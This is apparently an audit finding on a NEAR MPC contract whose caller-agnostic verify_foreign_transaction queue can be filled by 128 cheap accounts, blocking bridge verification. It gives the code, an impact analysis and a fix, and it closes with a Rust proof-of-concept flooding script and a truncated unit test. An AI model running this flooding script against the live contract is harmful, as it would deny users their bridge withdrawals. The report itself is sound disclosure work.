### Title
Caller-Agnostic `verify_foreign_transaction` Fan-Out Queue Can Be Saturated by 128 Unprivileged Accounts, Blocking Legitimate Foreign-Transaction Verification — (`crates/contract/src/pending_requests.rs`)

---

### Summary

The `pending_verify_foreign_tx_requests` map uses a **caller-agnostic** key (`VerifyForeignTransactionRequest = {request, domain_id, payload_version}`). Unlike `sign`, which binds the queue key to the caller's account ID, any 128 unprivileged accounts can fill the bounded fan-out queue (`MAX_PENDING_REQUEST_FAN_OUT = 128`) for a specific foreign transaction. Once saturated, every subsequent caller receives `PendingRequestQueueFull` until the MPC nodes respond and drain the queue. An attacker can continuously re-saturate the queue to maintain the block indefinitely at negligible cost (128 × 1 yoctoNEAR).

---

### Finding Description

**The bounded fan-out queue**

`push_pending_yield` in `crates/contract/src/pending_requests.rs` enforces a hard cap of 128 yields per request key:

```rust
pub const MAX_PENDING_REQUEST_FAN_OUT: u8 = 128;

pub(crate) fn push_pending_yield<K>(...) {
    let queue = requests.entry(request).or_default();
    if queue.len() >= usize::from(MAX_PENDING_REQUEST_FAN_OUT) {
        env::panic_str(&RequestError::PendingRequestQueueFull { limit: MAX_PENDING_REQUEST_FAN_OUT }.to_string());
    }
    queue.push(YieldIndex { data_id });
}
``` [1](#0-0) 

**The caller-agnostic key for `verify_foreign_transaction`**

`VerifyForeignTransactionRequest` — the map key for `pending_verify_foreign_tx_requests` — contains only `{request, domain_id, payload_version}`. The caller's account ID is **not** part of the key:

```rust
pub struct VerifyForeignTransactionRequest {
    pub request: ForeignChainRpcRequest,
    pub domain_id: DomainId,
    pub payload_version: ForeignTxPayloadVersion,
}
``` [2](#0-1) 

This is confirmed by the unit test comment: *"both yields are queued under the single (caller-agnostic) request key"*: [3](#0-2) 

**Contrast with `sign`**

`SignatureRequest::new` takes `&predecessor_account_id` as an explicit parameter, making each caller's queue independent. Two callers submitting the same payload and path produce **different** map keys. `verify_foreign_transaction` has no such isolation. [4](#0-3) 

**The `verify_foreign_transaction` entry point**

The function accepts any caller with 1 yoctoNEAR attached and calls `add_verify_foreign_tx_request`, which calls `push_pending_yield` on the shared map: [5](#0-4) 

---

### Impact Explanation

`verify_foreign_transaction` is the on-chain gateway for bridge operations: a caller submits a foreign-chain transaction ID, MPC nodes verify it on-chain, and the resulting threshold signature is returned to the caller to prove the transaction occurred. If the queue for a specific `(tx_id, domain_id, payload_version)` tuple is saturated, every subsequent caller receives `PendingRequestQueueFull` and cannot obtain the verification signature for that transaction until the queue drains (up to `REQUEST_EXPIRATION_BLOCKS = 200` blocks, ~4 minutes on NEAR).

An attacker who wants to block a specific bridge withdrawal or cross-chain proof can:
1. Observe the target `tx_id` on the foreign chain (public information).
2. Submit 128 `verify_foreign_transaction` calls from 128 accounts, each costing 1 yoctoNEAR.
3. The queue is now full; the legitimate caller's call panics with `PendingRequestQueueFull`.
4. After the MPC nodes respond and drain the queue, the attacker immediately re-saturates it.

This breaks the production request-lifecycle invariant: a legitimate caller with a valid foreign transaction cannot obtain a verification signature on demand, which can delay or permanently block bridge fund releases if the attacker sustains the attack.

---

### Likelihood Explanation

- **Cost**: 128 × 1 yoctoNEAR ≈ 0 NEAR per saturation cycle. NEAR account creation costs ~0.1 NEAR; 128 accounts cost ~12.8 NEAR total (one-time).
- **Skill**: No cryptographic knowledge required; only the target `tx_id` (public on the foreign chain) and the `domain_id` (public contract state) are needed.
- **Sustainability**: The attacker can automate re-saturation. Each cycle costs only gas (~7 TGas × 128 calls) plus 128 yoctoNEAR deposit (refunded on timeout).
- **Detection**: The attack is indistinguishable from 128 legitimate users all wanting the same verification simultaneously.

---

### Recommendation

Bind the `verify_foreign_transaction` queue key to the caller's account ID, mirroring the `sign` design. Concretely, add `predecessor_account_id: AccountId` to `VerifyForeignTransactionRequest` (or a separate internal key type used only for the fan-out map). This gives each caller an independent queue slot, eliminating cross-caller saturation while preserving the fan-out deduplication benefit for the same caller submitting duplicates.

Alternatively, apply a per-account rate limit (e.g., one pending `verify_foreign_transaction` per account per `tx_id`) enforced in the contract before `push_pending_yield` is called.

---

### Proof of Concept

```rust
// Attacker saturates the queue for a target Bitcoin tx_id
let target_tx_id = [0xde; 32]; // observed on Bitcoin mempool/chain
let request_args = VerifyForeignTransactionRequestArgs {
    domain_id: DomainId::default().0.into(),
    payload_version: ForeignTxPayloadVersion::V1,
    request: ForeignChainRpcRequest::Bitcoin(BitcoinRpcRequest {
        tx_id: target_tx_id.into(),
        confirmations: 1.into(),
        extractors: vec![BitcoinExtractor::BlockHash],
    }),
};

// 128 attacker accounts each call verify_foreign_transaction with 1 yoctoNEAR
for attacker_account in attacker_accounts.iter().take(128) {
    attacker_account
        .call(contract.id(), "verify_foreign_transaction")
        .args_json(json!({ "request": request_args }))
        .deposit(NearToken::from_yoctonear(1))
        .max_gas()
        .transact()
        .await?;
}

// Legitimate user now gets PendingRequestQueueFull
let result = victim
    .call(contract.id(), "verify_foreign_transaction")
    .args_json(json!({ "request": request_args }))
    .deposit(NearToken::from_yoctonear(1))
    .max_gas()
    .transact()
    .await?;

// result contains: "Pending-request queue is full for this request key (limit: 128)"
assert!(result.is_failure());
```

    #[test]
    fn add_signature_request__should_panic_when_pending_queue_is_full() {
        // Given: a contract with a queue already at the fan-out cap for some request key.
        let (context, mut contract, _) = basic_setup(Curve::Secp256k1, &mut OsRng);
        let signature_request = SignatureRequest::new(
            DomainId::default(),
            Payload::from_legacy_ecdsa([3u8; 32]),
            &context.predecessor_account_id,
            "m/44'\''/60'\''/0'\''/0/0",
        );
        for i in 0..MAX_PENDING_REQUEST_FAN_OUT {
            contract.add_signature_request(signature_request.clone(), [i; 32]);
        }
        assert_eq!(
            contract
                .pending_signature_requests
                .get(&signature_request)
                .map(|q| q.len()),
            Some(usize::from(MAX_PENDING_REQUEST_FAN_OUT)),
        );

        // When: one more append is attempted.
        let result = panic::catch_unwind(panic::AssertUnwindSafe(|| {
            contract.add_signature_request(signature_request.clone(), [0xff; 32]);
        }));

        // Then: it panics with the typed cap-exceeded error and leaves the queue untouched.
        let err = result.expect_err("appending past the cap should panic");
        let msg = err
            .downcast_ref::<String>()
            .map(String::as_str)
            .or_else(|| err.downcast_ref::<&str>().copied())
            .unwrap_or_default();
        assert!(
            msg.contains("Pending-request queue is full"),
            "unexpected panic message: {msg}",
        );
        assert_eq!(
            contract
                .pending_signature_requests
                .get(&signature_request)
                .map(|q| q.len()),
            Some(usize::from(MAX_PENDING_REQUEST_FAN_OUT)),
            "queue should not have grown past the cap",
        );
